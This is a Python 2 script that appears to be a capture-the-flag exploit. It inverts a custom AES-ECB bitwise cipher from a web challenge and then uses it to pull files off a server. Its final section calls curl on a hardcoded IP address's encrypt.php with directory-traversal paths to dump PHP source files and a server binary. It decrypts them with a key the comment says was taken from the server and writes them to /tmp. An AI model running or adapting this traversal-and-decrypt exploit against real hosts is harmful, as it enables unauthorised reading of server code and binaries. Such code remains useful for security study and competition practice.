from Crypto.Cipher import AES
from sys import argv
from os import chdir
j = 16


def i(s): return s + (j - len(s) % j) * chr(j - len(s) % j) # pad


def q(s): return s[:-ord(s[len(s) - 1:])] # unpad


def g(A, raw):
    d = AES.new(A, AES.MODE_ECB)
    return d.encrypt(raw)


def P(pwd, data, is_encrypt=True):
    B = ''
    m = bytearray(16) # m=0
    B = ''
    for s in range(0, len(data), 16): # s is the index of cur enc data block
        N = bytearray(data[s:s + 16]) # N is the data to encrypt
        print 'N=',''.join('{:08b} '.format(N[i]) for i in range(16))
        for i in range(128): # enc takes 128 waves
            r = g(pwd, str(m))
            r = ord(r[0]) # 1/16 of encrypted whole buffer is unhelpful, seen as rand
            print ''.join('{:08b} '.format(m[i]) for i in range(16)), 'r =',r>>7
            ff = i & 7       # wave & 7
            N[i >> 3] ^= (r & 0x80) >> (i & 7) # extract enced buffer one bit each time !!!???
            V = 1
            # m is reassigned using some intricate algorithm
            # 01234, 56789, abcde
            # a'=a<<1 | b>>7
            # b'=b<<1 | c>>7
            # c'=c<<1 | d>>7
            # d'=d<<1 | e>>7
            # e'=e<<1 | f>>7
            for j in range(3):
                L = m[V]
                m[V - 1] = ((2 * m[V - 1]) & 0xff) | (m[V] >> 7)
                l = m[V + 1]
                D = ((2 * L) & 0xff) | (m[V + 1] >> 7)
                W = m[V + 2]
                m[V] = D
                K = ((2 * l) & 0xff) | (W >> 7)
                a = m[V + 3]
                m[V + 1] = K
                I = ((2 * W) & 0xff) | (a >> 7)
                M = ((2 * a) & 0xff) | (m[V + 4] >> 7)
                m[V + 2] = I
                m[V + 3] = M
                V += 5
            m[15] = ((2 * m[15]) & 0xff) | (N[i >> 3] >> (7 - ff))
        B += str(m)
    return B
def D(pwd, data, is_encrypt=True):
    B = ''
    m = bytearray(16) # m=0
    B = ''
    for s in range(0, len(data), 16): # s is the index of cur enc data block
        N = bytearray(data[s:s + 16]) # N is the data to encrypt
        #print 'N=',''.join('{:08b} '.format(N[i]) for i in range(16))
        for i in range(128): # enc takes 128 waves
            r = g(pwd, str(m))
            r = ord(r[0]) # 1/16 of encrypted whole buffer is unhelpful, seen as rand
            #print ''.join('{:08b} '.format(m[i]) for i in range(16)), 'r =',r>>7
            ff = i & 7       # wave & 7
            V = 1
            # m is reassigned using some intricate algorithm
            # 01234, 56789, abcde
            # a'=a<<1 | b>>7
            # b'=b<<1 | c>>7
            # c'=c<<1 | d>>7
            # d'=d<<1 | e>>7
            # e'=e<<1 | f>>7
            for j in range(3):
                L = m[V]
                m[V - 1] = ((2 * m[V - 1]) & 0xff) | (m[V] >> 7)
                l = m[V + 1]
                D = ((2 * L) & 0xff) | (m[V + 1] >> 7)
                W = m[V + 2]
                m[V] = D
                K = ((2 * l) & 0xff) | (W >> 7)
                a = m[V + 3]
                m[V + 1] = K
                I = ((2 * W) & 0xff) | (a >> 7)
                M = ((2 * a) & 0xff) | (m[V + 4] >> 7)
                m[V + 2] = I
                m[V + 3] = M
                V += 5
            m[15] = ((2 * m[15]) & 0xff) | ((N[i >> 3] >> (7 - ff))&1)
            N[i >> 3] ^= (r & 0x80) >> (i & 7) # extract enced buffer one bit each time !!!???
        B += str(N)
    return B

"""
chdir("/var/www/html/")
A = open("key", "rb").read().strip()
# padded key + val
print P(i(A), i(open(argv[1], "rb").read())).encode("base64")
"""
A='IWantS0meM0rek3Y' # Downloaded from the server.

def enc(a,b):
    return P(i(a),i(b))
def dec(a,b):
    return q((D(i(a),b)))



################################################
#
# Uses encrypt.php and the decryption function to dump files off server.
#

from subprocess import check_output

def print_file(path, dump=False):
  print '\n\n'
  dat = check_output(('curl', '-s', 'http://13.125.6.142/encrypt.php?a='+path))
  print '>>>', path
  x = dec(A,dat[dat.index('<pre>')+5:dat.index('</pre>')].strip().decode('base64'))
  if dump:
    import os.path
    out = '/tmp/'+os.path.basename(path)
    open(out, 'w').write(x)
    print 'wrote to', out
  else:
    print x

print_file('../s_view.php')
print_file('../view.php')
print_file('../encrypt.php')
print_file('../proc.php')
print_file('../delete.php')
print_file('../share.php')

# The binary used by ../proc.php
print_file('../../../../../../../server', dump=True)
